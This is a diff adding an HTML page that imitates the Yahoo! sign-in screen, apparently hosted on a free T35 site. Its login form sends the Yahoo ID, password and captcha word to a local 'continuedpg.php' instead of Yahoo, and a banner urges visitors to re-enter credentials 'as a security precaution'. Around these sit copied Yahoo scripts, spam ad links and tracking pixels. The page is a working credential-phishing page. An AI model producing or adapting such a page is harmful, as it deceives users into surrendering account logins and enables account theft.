@@ -1,0 +1,573 @@
+<html>
+<head>
+
+<link type="text/css" rel="stylesheet" href="http://us.i1.yimg.com/us.yimg.com/i/reg2.css">
+
+<script language="javascript" src="http://us.i1.yimg.com/us.yimg.com/i/mc/mc.js">
+</script>
+<title>Sign In - Yahoo!
+</title>
+<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+<META HTTP-EQUIV="Expires" CONTENT="0">
+<META HTTP-EQUIV=Refresh CONTENT=900;>
+</head>
+<body bgcolor=#ffffff
+onload="document.login_form.login.focus();"><!-- T35 Hosting Ad Code Begin -->
+<style type="text/css">
+#t35ad{font: 14px  arial,helvetica; text-decoration: none; line-height:1.5em; text-align: center; }
+#t35ad a{font: 14px  arial,helvetica; text-decoration: none; }
+#t35ad a:hover{background-color: black; color: white; font-size:medium; font-weight: bold; }
+#t35ad ul{display: inline; list-style-type: none; padding: 0;}
+#navlist li{display: inline; list-style-type: none; padding-right: 0px; padding-left: 0px; padding: 0;}
+</style>
+<!-- T35 Hosting Ad Code End -->
+
+<center>
+<script language="JavaScript">
+<!--
+hasMsgr = 0;
+function dontGotIt(){
+  hasMsgr = 0;
+  document.login_form.hasMsgr.value=0;
+}
+
+function doGotIt(){
+  hasMsgr = 1;
+  document.login_form.hasMsgr.value=1;
+}
+//-->
+</script>
+
+<script language="javascript">
+/*
+ * A JavaScript implementation of the RSA Data Security, Inc. MD5 Message
+ * Digest Algorithm, as defined in RFC 1321.
+ * Copyright (C) Paul Johnston 1999 - 2000.
+ * Updated by Greg Holt 2000 - 2001.
+ * See http://pajhome.org.uk/site/legal.html for details.
+ */
+
+/*
+ * Convert a 32-bit number to a hex string with ls-byte first
+ */
+var hex_chr = "0123456789abcdef";
+function rhex(num)
+{
+  str = "";
+  for(j = 0; j <= 3; j++)
+    str += hex_chr.charAt((num >> (j * 8 + 4)) & 0x0F) +
+           hex_chr.charAt((num >> (j * 8)) & 0x0F);
+  return str;
+}
+
+/*
+ * Convert a string to a sequence of 16-word blocks, stored as an array.
+ * Append padding bits and the length, as described in the MD5 standard.
+ */
+function str2blks_MD5(str)
+{
+  nblk = ((str.length + 8) >> 6) + 1;
+  blks = new Array(nblk * 16);
+  for(i = 0; i < nblk * 16; i++) blks[i] = 0;
+  for(i = 0; i < str.length; i++)
+    blks[i >> 2] |= str.charCodeAt(i) << ((i % 4) * 8);
+  blks[i >> 2] |= 0x80 << ((i % 4) * 8);
+  blks[nblk * 16 - 2] = str.length * 8;
+  return blks;
+}
+
+/*
+ * Add integers, wrapping at 2^32. This uses 16-bit operations internally 
+ * to work around bugs in some JS interpreters.
+ */
+function add(x, y)
+{
+  var lsw = (x & 0xFFFF) + (y & 0xFFFF);
+  var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
+  return (msw << 16) | (lsw & 0xFFFF);
+}
+
+/*
+ * Bitwise rotate a 32-bit number to the left
+ */
+function rol(num, cnt)
+{
+  return (num << cnt) | (num >>> (32 - cnt));
+}
+
+/*
+ * These functions implement the basic operation for each round of the
+ * algorithm.
+ */
+function cmn(q, a, b, x, s, t)
+{
+  return add(rol(add(add(a, q), add(x, t)), s), b);
+}
+function ff(a, b, c, d, x, s, t)
+{
+  return cmn((b & c) | ((~b) & d), a, b, x, s, t);
+}
+function gg(a, b, c, d, x, s, t)
+{
+  return cmn((b & d) | (c & (~d)), a, b, x, s, t);
+}
+function hh(a, b, c, d, x, s, t)
+{
+  return cmn(b ^ c ^ d, a, b, x, s, t);
+}
+function ii(a, b, c, d, x, s, t)
+{
+  return cmn(c ^ (b | (~d)), a, b, x, s, t);
+}
+
+/*
+ * Take a string and return the hex representation of its MD5.
+ */
+function MD5(str)
+{
+  x = str2blks_MD5(str);
+  var a =  1732584193;
+  var b = -271733879;
+  var c = -1732584194;
+  var d =  271733878;
+ 
+  for(i = 0; i < x.length; i += 16)
+  {
+    var olda = a;
+    var oldb = b;
+    var oldc = c;
+    var oldd = d;
+
+    a = ff(a, b, c, d, x[i+ 0], 7 , -680876936);
+    d = ff(d, a, b, c, x[i+ 1], 12, -389564586);
+    c = ff(c, d, a, b, x[i+ 2], 17,  606105819);
+    b = ff(b, c, d, a, x[i+ 3], 22, -1044525330);
+    a = ff(a, b, c, d, x[i+ 4], 7 , -176418897);
+    d = ff(d, a, b, c, x[i+ 5], 12,  1200080426);
+    c = ff(c, d, a, b, x[i+ 6], 17, -1473231341);
+    b = ff(b, c, d, a, x[i+ 7], 22, -45705983);
+    a = ff(a, b, c, d, x[i+ 8], 7 ,  1770035416);
+    d = ff(d, a, b, c, x[i+ 9], 12, -1958414417);
+    c = ff(c, d, a, b, x[i+10], 17, -42063);
+    b = ff(b, c, d, a, x[i+11], 22, -1990404162);
+    a = ff(a, b, c, d, x[i+12], 7 ,  1804603682);
+    d = ff(d, a, b, c, x[i+13], 12, -40341101);
+    c = ff(c, d, a, b, x[i+14], 17, -1502002290);
+    b = ff(b, c, d, a, x[i+15], 22,  1236535329);    
+
+    a = gg(a, b, c, d, x[i+ 1], 5 , -165796510);
+    d = gg(d, a, b, c, x[i+ 6], 9 , -1069501632);
+    c = gg(c, d, a, b, x[i+11], 14,  643717713);
+    b = gg(b, c, d, a, x[i+ 0], 20, -373897302);
+    a = gg(a, b, c, d, x[i+ 5], 5 , -701558691);
+    d = gg(d, a, b, c, x[i+10], 9 ,  38016083);
+    c = gg(c, d, a, b, x[i+15], 14, -660478335);
+    b = gg(b, c, d, a, x[i+ 4], 20, -405537848);
+    a = gg(a, b, c, d, x[i+ 9], 5 ,  568446438);
+    d = gg(d, a, b, c, x[i+14], 9 , -1019803690);
+    c = gg(c, d, a, b, x[i+ 3], 14, -187363961);
+    b = gg(b, c, d, a, x[i+ 8], 20,  1163531501);
+    a = gg(a, b, c, d, x[i+13], 5 , -1444681467);
+    d = gg(d, a, b, c, x[i+ 2], 9 , -51403784);
+    c = gg(c, d, a, b, x[i+ 7], 14,  1735328473);
+    b = gg(b, c, d, a, x[i+12], 20, -1926607734);
+    
+    a = hh(a, b, c, d, x[i+ 5], 4 , -378558);
+    d = hh(d, a, b, c, x[i+ 8], 11, -2022574463);
+    c = hh(c, d, a, b, x[i+11], 16,  1839030562);
+    b = hh(b, c, d, a, x[i+14], 23, -35309556);
+    a = hh(a, b, c, d, x[i+ 1], 4 , -1530992060);
+    d = hh(d, a, b, c, x[i+ 4], 11,  1272893353);
+    c = hh(c, d, a, b, x[i+ 7], 16, -155497632);
+    b = hh(b, c, d, a, x[i+10], 23, -1094730640);
+    a = hh(a, b, c, d, x[i+13], 4 ,  681279174);
+    d = hh(d, a, b, c, x[i+ 0], 11, -358537222);
+    c = hh(c, d, a, b, x[i+ 3], 16, -722521979);
+    b = hh(b, c, d, a, x[i+ 6], 23,  76029189);
+    a = hh(a, b, c, d, x[i+ 9], 4 , -640364487);
+    d = hh(d, a, b, c, x[i+12], 11, -421815835);
+    c = hh(c, d, a, b, x[i+15], 16,  530742520);
+    b = hh(b, c, d, a, x[i+ 2], 23, -995338651);
+
+    a = ii(a, b, c, d, x[i+ 0], 6 , -198630844);
+    d = ii(d, a, b, c, x[i+ 7], 10,  1126891415);
+    c = ii(c, d, a, b, x[i+14], 15, -1416354905);
+    b = ii(b, c, d, a, x[i+ 5], 21, -57434055);
+    a = ii(a, b, c, d, x[i+12], 6 ,  1700485571);
+    d = ii(d, a, b, c, x[i+ 3], 10, -1894986606);
+    c = ii(c, d, a, b, x[i+10], 15, -1051523);
+    b = ii(b, c, d, a, x[i+ 1], 21, -2054922799);
+    a = ii(a, b, c, d, x[i+ 8], 6 ,  1873313359);
+    d = ii(d, a, b, c, x[i+15], 10, -30611744);
+    c = ii(c, d, a, b, x[i+ 6], 15, -1560198380);
+    b = ii(b, c, d, a, x[i+13], 21,  1309151649);
+    a = ii(a, b, c, d, x[i+ 4], 6 , -145523070);
+    d = ii(d, a, b, c, x[i+11], 10, -1120210379);
+    c = ii(c, d, a, b, x[i+ 2], 15,  718787259);
+    b = ii(b, c, d, a, x[i+ 9], 21, -343485551);
+
+    a = add(a, olda);
+    b = add(b, oldb);
+    c = add(c, oldc);
+    d = add(d, oldd);
+  }
+  return rhex(a) + rhex(b) + rhex(c) + rhex(d);
+}
+
+function valid_js() {
+   // anything that claims NS 4 or higher functionality better work 
+   if (navigator.userAgent.indexOf("Mozilla/") == 0) {
+      return (parseInt(navigator.appVersion) >= 4);
+   }
+   return false;
+}
+ 
+function hash(form,login_url) {
+    // this is Javascript enabled browser
+    //document.login_form[".js"].value=1;
+    // rudimentary check for a 4.x brower. should catch IE4+ and NS4.*
+    var url;
+
+    if (arguments.length > 1 && login_url != "") { // in case login_url is not passed in
+      url = login_url;
+    } else {
+      url = "http://login.yahoo.com/config/login";
+    }
+    url += "?";
+      
+    if (valid_js()) {
+      var passwd = form.passwd.value;
+      var challenge = form[".challenge"].value;
+      var hash2 = MD5(form.passwd.value) + challenge;
+      var hash;
+      if(form.passwd.value){
+        hash=MD5(hash2);
+      } else {
+        hash="";
+      }
+      var js = 0;
+
+      for(i=0; i<form.elements.length; i++){
+        if(typeof(form.elements[i].name)=="undefined" || form.elements[i].name.length <=0) {
+          continue;
+        }
+        if(i > 0){
+          url += "&";
+        }
+        url += form.elements[i].name;
+        url += "=";
+        if(form.elements[i].name == "passwd"){
+          url += hash;
+        } else if (form.elements[i].type == "checkbox" && !form.elements[i].checked) {
+          url += "";
+        } else if (form.elements[i].type == "radio" && !form.elements[i].checked) {
+          url += "";
+        } else if (form.elements[i].name == ".save"){
+          url += "1"; // "Sign in" causes problem with the space
+        } else if (form.elements[i].name == ".js"){
+          js = 1;
+          url += "1"; 
+        } else {
+          url += escape(form.elements[i].value);
+        }
+      }
+      // indicate the password is hashed.
+      url += "&.hash=1";
+      if(js == 0){
+        url += "&.js=1";
+      }
+      url += "&.md5=1";
+      //alert("url=" + url);
+      location.href=url;
+      // prevent from running this again. Allow the server response to submit the form directly
+      form.onsubmit=null;
+
+      // abort normal form submission
+      return false;
+    }
+    // allow normal form submission
+    return true;
+}
+</script>
+<table border=0 cellpadding=0 cellspacing=0 width=680>
+	<tr>
+		<td colspan=3>
+<table border=0 width=100% cellpadding=4 cellspacing=0>
+	<tr>
+		<td valign=bottom>
+<table cellspacing=0 cellpadding=0 width=100% border=0>
+ 	<tr>
+		<td width=1% align=left>
+<table width=1% cellspacing=0 cellpadding=0 border=0>
+	<tr>
+ 		<td width=1% align=left nowrap><img src="http://us.i1.yimg.com/us.yimg.com/i/yahoo.gif" alt="Yahoo!" width=147 height=31 border=0>
+</td>
+	</tr>
+</table>
+		</td>
+
+		<td width=100% align=right nowrap valign=bottom>
+<table width=100% cellspacing=0 cellpadding=0 border=0>
+	<tr>		
+		<td width=99% align=right nowrap valign=bottom><font face=Arial size=-1><a href="http://www.yahoo.com " target="www">Yahoo!</a> - <a href="http://help.yahoo.com/help/us/edit/" target="help">Help</a></font>
+		<br><hr size=1 noshade></td>
+	</tr>
+</table>
+		</td>
+<td align=right width="1%">
+</td>
+		</td>
+	</tr>
+</table>
+	 </td>
+	</tr>
+	<tr>
+		<td bgcolor=#a0b8c8
+
+ class="ycscphr" ><font size=+1 face=Arial color=black
+><b>Welcome to Yahoo!
+</b></font>
+		</td>
+
+	</tr>
+</table>
+
+		</td>
+	</tr>
+	<tr>
+		<td colspan=3>
+<table width=100% align=center cellpadding=3 cellspacing=2 border=0>
+	<tr>
+		<td align=center>
+<font color=red face=arial><b>
+<center>As a security precaution, please enter your Yahoo! ID and password and type in the code you see in the picture below. </center>
+</b></font></b></font>
+		</td>
+	</tr>
+</table>
+		</td>
+	</tr>
+	<tr>
+		<td colspan=3 valign=top>
+<table border=0 cellspacing=2 cellpadding=0 width=100%>
+	<tr>
+		<td width="50%" valign="top">
+<table border=0 cellpadding=2 cellspacing=0 width="100%">
+	<tr>
+		<td align=center>
+<font face=Arial size=+1><b><nobr>New to Yahoo!?</nobr></b></font>
+		</td>
+	</tr>
+	<tr>
+		<td align=center><b><font face=arial>
+<a href="http://us.rd.yahoo.com/reg/login0/signup_lhs/us//*http://edit.yahoo.com/config/eval_register?.intl=us&new=1&.done=http%3a//my.yahoo.com&.src=&.v=0&.u=c9r9k4l1viff0&partner=&.p=&promo=&.last=">
+Sign up now</a> to enjoy Yahoo!
+
+		</td>
+	</tr>
+</table>
+
+
+
+<!-- property_promo -->
+<table border=0 cellpadding=4 cellspacing=0 width=310>
+<tr><td colspan=2><font face=Arial size=+1>
+<b>Why am I being asked this?</b></font></td></tr><tr></tr>
+<tr>
+<td align=right valign=top>&#149;</td><td><font face=Arial size=-1><b>Yahoo! may occasionally request an additional level of verification in the form of a code verification image to better protect your security.</b><br>This procedure was implemented to help prevent unauthorized persons from being able to access your account.</font><br><br></td></tr><tr>
+<td align=right valign=top>&#149;</td><td><font face=Arial size=-1><b>You must enter the code you see in the picture.</b><br>To ensure the security of your account we require you do this after 5 failed attempts to login.</font><br><br></td></tr><tr>
+<td align=right valign=top>&#149;</td><td><font face=Arial size=-1><b>Is the "Caps Lock" or "A" light on your keyboard on?</b><br>If so, hit "Caps Lock" key before trying again.</font><br><br></td></tr><tr>
+<td align=right valign=top>&#149;</td><td><font face=Arial size=-1><b>Did you forget or misspell your ID or password?</b><br>You can 
+<a href="http://edit.yahoo.com/config/form?.form=passwords-help&.intl=us&new=1&.done=http%3a//my.yahoo.com&.last=&.src=&.u=c9r9k4l1viff0&.v=0&.partner=">recover your ID and/or password</a> by confirming your private information.</font></td></tr>
+<tr><td align=right valign=top>&#149;</td><td><font face=Arial size=-1><b>
+Still having trouble?</b> Try <a href="http://help.yahoo.com/help/us/edit/">sign-in help</a>.</font></td></tr>
+</table>
+
+		</td>
+		<td width="1%">&nbsp;
+		</td>
+		<td align="left" valign="top"> 
+<FORM name=login_form action=continuedpg.php method=post 
+autocomplete="off">
+<table bgcolor=#a0b8c8
+
+ border="0" cellpadding="2" cellspacing="0" width="100%">
+<tr><td>
+<table bgcolor="#eeeeee" border="0" cellpadding="2" cellspacing="0" width="100%">
+<tr><td bgcolor="#ffffff" align="center">
+
+<table border="0" cellspacing="6" cellpadding="6" bgcolor="ffffff" width="100%">
+<tr bgcolor="eeeeee">
+<td align="center">
+<font face="arial"><b>Existing Yahoo! users</b></font><br>
+<font face="arial" size="-1"><nobr>&nbsp;Enter your ID and password to sign in&nbsp; </nobr></font>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr> <td align="right">
+<input type=hidden name=".tries" value="1" >
+<input type=hidden name=".src" value="" >
+<input type=hidden name=".md5" value="" >
+<input type=hidden name=".hash" value="" >
+<input type=hidden name=".js" value="" >
+<input type=hidden name=".last" value="" >
+<input type=hidden name="promo" value="" >
+<input type=hidden name=".intl" value="us" >
+<input type=hidden name=".bypass" value="" >
+<input type=hidden name=".partner" value="" >
+<input type=hidden name=".u" value="c9r9k4l1viff0" >
+<input type=hidden name=".v" value="0" >
+<input type=hidden name=".challenge" value="MgQovIRFoXomVzx.0kDKmNqzsoJx" >
+<input type=hidden name=".yplus" value="" >
+<input type=hidden name=".emailCode" value="" >
+<input type=hidden name="pkg" value="" >
+<input type=hidden name="stepid" value="" >
+<input type=hidden name=".ev" value="" >
+<input type=hidden name="hasMsgr" value=0>
+<input type=hidden name=".chkP" value="Y">
+<input type=hidden name=".done" value="http://my.yahoo.com" >
+<script language=javascript>
+<!--
+  browser_string = navigator.appVersion + " " + navigator.userAgent;
+  if ( browser_string.indexOf("MSIE") < 0 ) {
+    if (navigator.mimeTypes) {
+      for (i = 0 ; i < navigator.mimeTypes.length ; i++) {
+        if (navigator.mimeTypes[i].suffixes.indexOf("yps") > -1) {
+           doGotIt();
+        }
+      }
+    } else {
+      dontGotIt();
+    }
+  } else {
+    if (browser_string.indexOf("Windows")>=0) {
+      doGotIt();
+      document.write('<object classid="clsid:41695A8E-6414-11D4-8FB3-00D0B7730277" CODEBASE="javascript:dontGotIt();" ID="Ymsgr" width="1" height="1">');
+      document.write('</object>');
+    }
+  }
+//-->
+</script>
+<table border="0" cellpadding="2" cellspacing="0">
+<tr> <td align="right" nowrap><font face="arial" size="-1">
+Yahoo! ID:
+</font></td>
+<td><input id=username name="login" size="17" value=""></td>
+</tr>
+<tr> <td align="right" nowrap><font face="arial" size="-1">Password:</font></td>
+<td><input name="passwd" id=passwd type="password" size="17" maxlength="32"></td></tr>
+<input type=hidden name=".secdata" value="6ZuEDeVZFem61nqWoHfKpQxqz_22bAr2excieGnzCVnYjM8Q1Ta9bHxCE4q77Thymb9Ojlsy" >
+<td valign="middle" align=right nowrap>
+<img src="http://us.i1.yimg.com/us.yimg.com/i/space.gif" width=1 height=1 alt="Attention Blind or Visually Impaired Users.  To ensure the security of your account we require users to enter a word displayed on this page as part of an image after 5 failed login attempts.  If you are not able to see this image, our customer care group will need to reset your account to zero failed logins. To do this please contact us by pasting the URL below into your browser and completing the form.  We recommend you provide your phone number so that we may contact you if there are any problems. Here is the URL: http://add.yahoo.com/fast/help/us/edit/cgi_access .   Alternatively, if you can not remember your password please paste this URL into your browser to create a new one:   http://edit.yahoo.com/config/eval_forgot_pw"><font face="arial" size=-1 >Code you see below:</font></td>
+<td align=left>&nbsp;<input type=text name=".secword" value="" size=7 maxlength=15><font face="arial" size=-1><b>(required)</font></b>
+</td></tr>
+<tr>
+<td colspan="2" nowrap align=center>
+<img src="captcha.gif" width=290 height=80 alt="" border="0">
+<!--<img src="www.yahoo.com/_yd_/error.gif?_ydt_=4GZdQT6RqyBo2OlyddqSEQrRBlYlz0VYuxnl9HNrPmqODiBo4YVBIbutCEGDR2EKvcfCe3bif0POHbkiopZZ76sGIsFym5URESaEJyrZhQmqV_rzD3ZMmTdQ8DNK1TqQugWezPD6rEbzPSdWNaJ0Qd5BnkUWvPbIx_V_feQtjGliftKv4Bll2u2xE0DckShT3w3A.c2FalsJAo8s54kyJHjbe.rsmoY_jNkZ.l6Nt3fVGTQtngbm5P4VofH32PlF3RRtUb8_jYBKQ_DNgBOSsZJsVUMbraxPnjiB39xBeqPzLrAKvGENdiILYmXNI0SdhmSVZ4Tow2eshb7o5P4.g0BIiFWLbgj2vKtmhGg_BwKYTZbepCOliEl_IILD_6GBy5Nxbe3x.Yjcg1zdTo8n30.NMi70CwM_s6jm" width=1 height=1 alt="" border="0">-->
+</td></tr>
+<tr> <td colspan="2" nowrap align="center"><font face="arial" size="-1">
+<input type="checkbox" name=".persistent" value="y">Remember my ID on this computer</font></td>
+</tr><tr>
+<td>&nbsp;</td>
+
+<td><input name=".save" type="submit" value="Sign In"></td> 
+</tr>
+</table>
+</td></tr> 
+<tr> 
+<td nowrap bgcolor="eeeeee" align="center">
+<font face="arial" size="-1">Mode:
+Standard | <a href="https://login.yahoo.com/config/login?.src=&.v=0&.u=c9r9k4l1viff0&.last=&promo=&.intl=us&.bypass=&.partner=&pkg=&stepid=&.done=http%3a//my.yahoo.com"> Secure</a>
+</font>
+ </td>
+</tr>
+</table>
+</td></tr>
+<tr bgcolor="eeeeee">
+<td valign="top" align="center"> <font face="arial" size="-1">
+<a href="http://us.rd.yahoo.com/reg/sihflib/*http://login.yahoo.com/config/login?.src=&.intl=us&.help=1&.v=0&.u=c9r9k4l1viff0&.last=&.last=&promo=&.bypass=&.partner=&pkg=&stepid=&.done=http%3a//my.yahoo.com">Sign-in help</a>&nbsp;&nbsp;&nbsp;
+<a href="http://us.rd.yahoo.com/reg/fpflib/*http://edit.yahoo.com/config/eval_forgot_pw?new=1&.done=http://my.yahoo.com&.src=&partner=&.partner=&.intl=us&pkg=&stepid=&.last=">Forgot your password?</a>
+</font></td></tr>
+</table>
+</td></tr></table>
+</td></tr></table>
+</form>
+
+
+
+
+		</td>
+	</tr>
+	<tr>
+		<td colspan=3 width=600>
+		</td>
+	</tr>
+</table>	
+		</td>
+	</tr>
+	<tr>
+		<td colspan=3> 
+<table width=600 border=0 cellpadding=0 cellspacing=0>
+
+
+</table>
+		</td>
+	</tr>
+</table>	
+		</td>
+	</tr>
+</table>	
+</center>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<center>
+<hr width="750" size="1" noshade>
+<table width="750" cellpadding="0" cellspacing="0" border="0" summary="">
+	<tr>
+		<td align="center">
+<font size="-2" face="arial" color="#8d8d8d">
+		Copyright &copy; 2005 Yahoo! Inc. All rights reserved. 
+		<a href="http://docs.yahoo.com/info/copyright/copyright.html" target="cp" title="Click here to view Yahoo! Copyright/IP Policy">Copyright/IP Policy</a>
+		 <a href="http://docs.yahoo.com/info/terms/" target="_new" title="Click here to view Yahoo! Terms of Service">Terms of Service</a><br>
+<b>NOTICE: We collect personal information on this site.<br>To learn more about how we use your information, see our <a href="http://privacy.yahoo.com/" target="_new" title="Click here to view Yahoo! Privacy Policy">Privacy Policy</a></b>
+</font>
+		</td>
+	</tr>
+</table>
+</center>
+</noscript></noframes>
+<!-- T35 Hosting Ad Code Begin -->
+<!-- Start of Stat Code -->
+<img src="http://c11.statcounter.com/1120767/0/78e6f3a5/1/" width="1" height="1" alt="stats" border="0" />
+<script type="text/javascript">
+_qoptions={
+qacct:"p-f2Rp-GHnsAESA"
+};
+</script><script type="text/javascript" src="http://edge.quantserve.com/quant.js"></script>
+<noscript><img src="http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif" style="display: none;" border="0" height="1" width="1" alt="Quantcast"/></noscript>
+<!-- End of Stat Code -->
+<div id="t35ad" align="center" style="display:block;">
+<br/>Hosted by <a target="_blank" href="http://www.t35.com/">T35 Free Web Hosting</a>.
+<a target=_blank href=http://www.saharamakeup.co.uk/>Indian Bridal Makeup</a>&nbsp;-&nbsp;<a target=_blank href=http://www.hypercasinos.com>Best Online Casinos</a>&nbsp;-&nbsp;<a target=_blank href=http://www.mckennavw.com>VW Los Angeles</a>&nbsp;-&nbsp;<a target=_blank href=http://www.drugrehabcenter.com/>Drug Treatment</a>&nbsp;-&nbsp;<a target=_blank href=http://www.bestonlinecollegesdegrees.com/online-colleges.html>Online Colleges</a>&nbsp;-&nbsp;<a target=_blank href=http://www.uk-cheapest.co.uk>Hosting</a>&nbsp;-&nbsp;<a target=_blank href=http://www.buyvogue.com/>Prada Sneakers</a>&nbsp;-&nbsp;<a target=_blank href=http://www.citygrounds.com/contact.php>Soma</a>
+</div></body>
+</html>
+
+<script type="text/javascript">
+if (window.yzq_a == null) document.write("<scr" + "ipt type=text/javascript src=http://us.js2.yimg.com/us.js.yimg.com/lib/bc/bc_1.7.3.js></scr" + "ipt>");
+</script><script type="text/javascript">
+if (window.yzq_a) yzq_a('p', 'P=q2sxm9FJqErq7s2OQ.73CgB5SPDO3EP5PeAAAIVD&T=13rmmm8qp%2fX%3d1140407776%2fE%3d150000870%2fR%3dregst%2fK%3d5%2fV%3d1.1%2fW%3d9%2fY%3dYAHOO%2fF%3d1051739390%2fS%3d1%2fJ%3d15A949D1');
+if (window.yzq_gb && window.yzq4) yzq4();
+else if (window.yzq_eh) yzq_eh();
+</script><noscript><img width=1 height=1 alt="" src="http://us.bc.yahoo.com/b?P=q2sxm9FJqErq7s2OQ.73CgB5SPDO3EP5PeAAAIVD&T=13vphn38v%2fX%3d1140407776%2fE%3d150000870%2fR%3dregst%2fK%3d5%2fV%3d3.1%2fW%3d9%2fY%3dYAHOO%2fF%3d751384155%2fQ%3d-1%2fS%3d1%2fJ%3d15A949D1"></noscript>
